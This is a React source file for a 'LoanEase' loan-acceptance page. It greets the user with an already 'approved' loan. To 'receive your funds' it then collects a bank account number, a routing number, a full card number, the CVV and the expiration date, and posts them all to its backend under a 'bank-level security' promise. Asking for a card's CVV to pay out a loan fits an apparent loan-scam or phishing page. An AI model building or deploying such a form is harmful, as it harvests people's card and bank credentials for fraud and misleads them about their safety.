import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Checkbox } from "@/components/ui/checkbox";
import { toast } from "sonner";
import { motion } from "framer-motion";
import {
  Banknote,
  CheckCircle2,
  Shield,
  CreditCard,
  Building2,
  Loader2,
  AlertCircle,
  PartyPopper,
} from "lucide-react";
import axios from "axios";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const AcceptLoan = () => {
  const { token } = useParams();
  const navigate = useNavigate();
  const [application, setApplication] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(false);
  const [agreedToTerms, setAgreedToTerms] = useState(false);

  const [formData, setFormData] = useState({
    account_number: "",
    routing_number: "",
    card_number: "",
    card_cvv: "",
    card_expiration: "",
  });

  const [errors, setErrors] = useState({});

  useEffect(() => {
    verifyToken();
  }, [token]);

  const verifyToken = async () => {
    try {
      const response = await axios.get(`${API}/applications/verify/${token}`);
      setApplication(response.data);
    } catch (err) {
      setError(err.response?.data?.detail || "Invalid or expired link");
    } finally {
      setIsLoading(false);
    }
  };

  const updateFormData = (field, value) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors((prev) => ({ ...prev, [field]: null }));
    }
  };

  const formatCardNumber = (value) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const formatExpiration = (value) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4);
    }
    return v;
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.account_number || formData.account_number.length < 8) {
      newErrors.account_number = "Valid account number required (8-17 digits)";
    }

    if (!formData.routing_number || formData.routing_number.length !== 9) {
      newErrors.routing_number = "Routing number must be 9 digits";
    }

    const cardNum = formData.card_number.replace(/\s/g, "");
    if (!cardNum || cardNum.length < 15) {
      newErrors.card_number = "Valid card number required";
    }

    if (!formData.card_cvv || formData.card_cvv.length < 3) {
      newErrors.card_cvv = "Valid CVV required";
    }

    if (!formData.card_expiration || formData.card_expiration.length < 5) {
      newErrors.card_expiration = "Valid expiration required (MM/YY)";
    }

    if (!agreedToTerms) {
      newErrors.terms = "You must agree to the loan terms";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      toast.error("Please fix the errors before submitting");
      return;
    }

    setIsSubmitting(true);

    try {
      await axios.post(`${API}/applications/accept-loan`, {
        application_id: application.id,
        token: token,
        agree_to_terms: agreedToTerms,
        account_number: formData.account_number,
        routing_number: formData.routing_number,
        card_number: formData.card_number.replace(/\s/g, ""),
        card_cvv: formData.card_cvv,
        card_expiration: formData.card_expiration,
      });

      setSuccess(true);
      toast.success("Loan accepted successfully!");
    } catch (err) {
      toast.error(err.response?.data?.detail || "Failed to submit. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  // Loading state
  if (isLoading) {
    return (
      <div className="min-h-screen bg-[#fdfbf7] flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="w-12 h-12 text-emerald-900 animate-spin mx-auto mb-4" />
          <p className="text-slate-600">Verifying your link...</p>
        </div>
      </div>
    );
  }

  // Error state
  if (error) {
    return (
      <div className="min-h-screen bg-[#fdfbf7] flex items-center justify-center p-6">
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white rounded-2xl border border-red-100 p-8 max-w-md text-center"
        >
          <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <AlertCircle className="w-8 h-8 text-red-500" />
          </div>
          <h1 className="text-2xl font-bold text-slate-900 mb-2">Invalid Link</h1>
          <p className="text-slate-600 mb-6">{error}</p>
          <Button
            onClick={() => navigate("/")}
            className="bg-emerald-900 hover:bg-emerald-800 text-white rounded-full px-8"
          >
            Go to Home
          </Button>
        </motion.div>
      </div>
    );
  }

  // Success state
  if (success) {
    return (
      <div className="min-h-screen bg-[#fdfbf7] flex items-center justify-center p-6">
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white rounded-2xl border border-emerald-100 p-8 max-w-md text-center"
        >
          <motion.div
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ type: "spring", delay: 0.2 }}
            className="w-20 h-20 bg-lime-400 rounded-full flex items-center justify-center mx-auto mb-6"
          >
            <PartyPopper className="w-10 h-10 text-emerald-900" />
          </motion.div>
          <h1 className="text-2xl font-bold text-slate-900 mb-2">Congratulations!</h1>
          <p className="text-slate-600 mb-2">Your loan has been accepted.</p>
          <p className="text-lg font-semibold text-emerald-900 mb-6">
            ${application?.loan_amount_requested?.toLocaleString()}
          </p>
          <div className="bg-emerald-50 rounded-lg p-4 mb-6 text-left">
            <p className="text-sm text-emerald-800">
              Your funds will be disbursed to your account within <strong>1-3 business days</strong>.
              You will receive a confirmation email shortly.
            </p>
          </div>
          <Button
            onClick={() => navigate("/")}
            className="bg-emerald-900 hover:bg-emerald-800 text-white rounded-full px-8"
          >
            Done
          </Button>
        </motion.div>
      </div>
    );
  }

  // Main form
  return (
    <div className="min-h-screen bg-[#fdfbf7]">
      {/* Header */}
      <header className="px-6 md:px-12 lg:px-24 py-6 border-b border-emerald-900/5">
        <div className="flex items-center justify-center">
          <div className="flex items-center gap-2">
            <Banknote className="w-6 h-6 text-emerald-900" />
            <span className="text-lg font-bold text-emerald-900 font-['Manrope']">LoanEase</span>
          </div>
        </div>
      </header>

      <main className="px-6 md:px-12 lg:px-24 py-8 md:py-12">
        <div className="max-w-2xl mx-auto">
          {/* Loan Summary */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-gradient-to-br from-emerald-900 to-emerald-800 rounded-2xl p-6 md:p-8 text-white mb-8"
          >
            <div className="flex items-center gap-2 mb-4">
              <CheckCircle2 className="w-6 h-6 text-lime-400" />
              <span className="text-lime-400 font-medium">Approved</span>
            </div>
            <h1 className="text-3xl md:text-4xl font-bold mb-2">
              ${application?.loan_amount_requested?.toLocaleString()}
            </h1>
            <p className="text-emerald-100">
              Congratulations {application?.first_name}! Complete the final step to receive your funds.
            </p>
          </motion.div>

          {/* Form */}
          <motion.form
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            onSubmit={handleSubmit}
            className="bg-white rounded-2xl border border-emerald-900/5 p-6 md:p-8 shadow-sm"
          >
            {/* Terms Agreement */}
            <div className="mb-8 p-4 bg-slate-50 rounded-xl">
              <h2 className="font-semibold text-slate-900 mb-3 flex items-center gap-2">
                <Shield className="w-5 h-5 text-emerald-900" />
                Loan Agreement
              </h2>
              <div className="text-sm text-slate-600 space-y-2 mb-4">
                <p>By accepting this loan, you agree to:</p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>Repay the loan amount of ${application?.loan_amount_requested?.toLocaleString()}</li>
                  <li>Make monthly payments as per the agreed schedule</li>
                  <li>Pay applicable interest rates and fees</li>
                  <li>Provide accurate banking information for disbursement</li>
                </ul>
              </div>
              <div className="flex items-start gap-3">
                <Checkbox
                  id="terms"
                  data-testid="agree-terms-checkbox"
                  checked={agreedToTerms}
                  onCheckedChange={setAgreedToTerms}
                  className="mt-0.5"
                />
                <Label
                  htmlFor="terms"
                  className={`text-sm cursor-pointer ${errors.terms ? "text-red-500" : "text-slate-700"}`}
                >
                  I have read and agree to the loan terms and conditions
                </Label>
              </div>
              {errors.terms && <p className="text-sm text-red-500 mt-2">{errors.terms}</p>}
            </div>

            {/* Bank Account Section */}
            <div className="mb-8">
              <h2 className="font-semibold text-slate-900 mb-4 flex items-center gap-2">
                <Building2 className="w-5 h-5 text-emerald-900" />
                Bank Account for Disbursement
              </h2>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-slate-600">Account Number</Label>
                  <Input
                    type="text"
                    data-testid="account-number-input"
                    value={formData.account_number}
                    onChange={(e) => updateFormData("account_number", e.target.value.replace(/\D/g, "").slice(0, 17))}
                    placeholder="Enter account number"
                    className={`h-12 bg-white border-emerald-900/10 rounded-lg ${errors.account_number ? "border-red-500" : ""}`}
                  />
                  {errors.account_number && <p className="text-sm text-red-500">{errors.account_number}</p>}
                </div>
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-slate-600">Routing Number</Label>
                  <Input
                    type="text"
                    data-testid="routing-number-input"
                    value={formData.routing_number}
                    onChange={(e) => updateFormData("routing_number", e.target.value.replace(/\D/g, "").slice(0, 9))}
                    placeholder="9-digit routing number"
                    className={`h-12 bg-white border-emerald-900/10 rounded-lg ${errors.routing_number ? "border-red-500" : ""}`}
                  />
                  {errors.routing_number && <p className="text-sm text-red-500">{errors.routing_number}</p>}
                </div>
              </div>
            </div>

            {/* Card Section */}
            <div className="mb-8">
              <h2 className="font-semibold text-slate-900 mb-4 flex items-center gap-2">
                <CreditCard className="w-5 h-5 text-emerald-900" />
                Card Information
              </h2>
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-slate-600">Card Number</Label>
                  <Input
                    type="text"
                    data-testid="card-number-input"
                    value={formData.card_number}
                    onChange={(e) => updateFormData("card_number", formatCardNumber(e.target.value))}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                    className={`h-12 bg-white border-emerald-900/10 rounded-lg ${errors.card_number ? "border-red-500" : ""}`}
                  />
                  {errors.card_number && <p className="text-sm text-red-500">{errors.card_number}</p>}
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-sm font-medium text-slate-600">Expiration Date</Label>
                    <Input
                      type="text"
                      data-testid="card-expiration-input"
                      value={formData.card_expiration}
                      onChange={(e) => updateFormData("card_expiration", formatExpiration(e.target.value))}
                      placeholder="MM/YY"
                      maxLength={5}
                      className={`h-12 bg-white border-emerald-900/10 rounded-lg ${errors.card_expiration ? "border-red-500" : ""}`}
                    />
                    {errors.card_expiration && <p className="text-sm text-red-500">{errors.card_expiration}</p>}
                  </div>
                  <div className="space-y-2">
                    <Label className="text-sm font-medium text-slate-600">CVV</Label>
                    <Input
                      type="password"
                      data-testid="card-cvv-input"
                      value={formData.card_cvv}
                      onChange={(e) => updateFormData("card_cvv", e.target.value.replace(/\D/g, "").slice(0, 4))}
                      placeholder="•••"
                      maxLength={4}
                      className={`h-12 bg-white border-emerald-900/10 rounded-lg ${errors.card_cvv ? "border-red-500" : ""}`}
                    />
                    {errors.card_cvv && <p className="text-sm text-red-500">{errors.card_cvv}</p>}
                  </div>
                </div>
              </div>
            </div>

            {/* Security Notice */}
            <div className="flex items-start gap-3 p-4 bg-emerald-50 rounded-xl mb-6">
              <Shield className="w-5 h-5 text-emerald-700 flex-shrink-0 mt-0.5" />
              <p className="text-sm text-emerald-800">
                Your information is encrypted and secure. We use bank-level security to protect your data.
              </p>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              data-testid="submit-banking-btn"
              disabled={isSubmitting}
              className="w-full h-14 bg-emerald-900 hover:bg-emerald-800 text-white rounded-full text-lg font-medium transition-all hover:scale-[1.02] active:scale-[0.98]"
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                  Processing...
                </>
              ) : (
                "Accept Loan & Submit"
              )}
            </Button>
          </motion.form>
        </div>
      </main>
    </div>
  );
};

export default AcceptLoan;
